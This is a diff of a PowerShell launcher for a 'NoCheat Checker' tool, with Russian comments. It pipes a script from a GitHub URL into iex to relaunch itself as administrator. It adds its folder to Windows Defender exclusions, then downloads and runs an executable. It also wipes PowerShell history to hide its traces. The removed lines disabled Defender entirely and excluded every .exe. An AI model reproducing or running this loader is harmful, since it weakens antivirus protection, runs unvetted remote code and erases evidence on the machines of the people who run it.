@@ -1,29 +1,77 @@
+# ==========================================================
+# NoCheat Checker Launcher
+# ==========================================================
+
 $ErrorActionPreference = "Stop"
-# Админ-проверка (оставляем как есть)
-# ... ваш код проверки админа ...
 
-# Исключения ДО действий
+
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# Helper function to clear PSReadLine and session history
+function Clear-PSHistory {
+    Clear-History -ErrorAction SilentlyContinue
+    try {
+        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
+        if ($historyPath -and (Test-Path $historyPath)) {
+            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
+        }
+    } catch {}
+}
+
+if (-not $isAdmin) {
+    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
+    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
+    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
+    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
+    Clear-PSHistory
+    exit
+}
+
+Write-Host "==========================================" -ForegroundColor Yellow
+Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
+Write-Host "==========================================" -ForegroundColor Yellow
+
+# ссылки на файлы в репо
+$repoOwner  = "die4mebaby"
+$repoName   = "CheatChecker"
+$branch     = "main"
+$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
+$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
+
+# директ добавляем в исключения
 $workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
-New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
 
-# Отключение Defender (полное)
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -Force
-Stop-Service -Name "WinDefend" -Force
+if (-not (Test-Path $workDir)) {
+    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+}
 
-# Загрузка через BITS с удалением ZoneId
-$exeUrl = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat.checker.exe"
 $exePath = Join-Path $workDir "nocheat.checker.exe"
-Start-BitsTransfer -Source $exeUrl -Destination $exePath -Priority High
-Unblock-File -Path $exePath
 
-# Запуск
-Start-Process -FilePath $exePath -WorkingDirectory $workDir
+try {
+    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
+        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
+        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+    }
 
-# Включение Defender через 20 сек
-Start-Sleep -Seconds 20
-Start-Service -Name "WinDefend"
-Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableBlockAtFirstSeen $false -DisableIOAVProtection $false
+    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
+    
+    # скачиваем файл
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($exeUrl, $exePath)
+    
+    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
+        Write-Warning "[!] Чекер не запустился ввиду ошибки или отсутствует вовсе."
+    }
+
+    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
+    
+    # Запуск без ожидания завершения
+    Start-Process -FilePath $exePath -WorkingDirectory $workDir
+}
+catch {
+    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+# клин повершелл команд и офф окна
 Clear-PSHistory
-exit 
+exit
